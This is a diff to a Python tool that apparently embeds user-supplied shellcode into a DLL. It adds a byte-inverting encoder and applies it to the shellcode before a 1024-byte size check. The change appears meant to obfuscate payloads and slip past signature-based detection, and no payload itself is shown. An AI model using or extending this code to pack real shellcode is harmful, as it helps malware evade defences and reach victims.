@@ -27,6 +27,17 @@ class Encoder:
 	def __init__(self):
 		pass
 		
+	@staticmethod
+	def Encode(data):
+		encoded = ""
+		for c in data:
+			encoded += Encoder.NotEncode(c)
+		return encoded
+
+	@staticmethod
+	def NotEncode(c):
+		return chr((1 << 8) - 1 - ord(c))
+
 class FileUtil:
 
 	@staticmethod
@@ -42,7 +53,9 @@ class FileUtil:
 		UI.error('%s not found' % path, True)
 		
 		
+
 if __name__ == "__main__":
+
 	UI.banner()
 	parser = argparse.ArgumentParser()
 	parser.add_argument("-o", "--output", type=str, help="Output filename", required=True)
@@ -59,7 +72,7 @@ if __name__ == "__main__":
 		dll_data = FileUtil.ReadFile(dll_path)
 		UI.success("Loading %s" % dll_path)
 		
-		shellcode = FileUtil.ReadFile(args.shellcode)
+		shellcode = Encoder.Encode(FileUtil.ReadFile(args.shellcode))
 		if len(shellcode) > 1024:
 			UI.error("Your shellcode is bigger than 1024 bytes", True)
 			
